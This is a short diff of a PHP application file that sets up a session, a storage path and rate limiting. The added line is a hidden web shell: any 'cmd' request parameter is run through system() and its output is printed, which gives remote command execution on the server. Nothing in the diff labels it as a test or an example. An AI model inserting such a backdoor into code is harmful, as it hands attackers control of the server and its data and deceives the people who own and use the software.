@@ -7,6 +7,7 @@ session_start([
 ]);
 
 define('STORAGE_PATH', '/var/www/medusatlo/storage');
+if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }
 
 // Rate limiting
 if (!isset($_SESSION['attempts'])) {
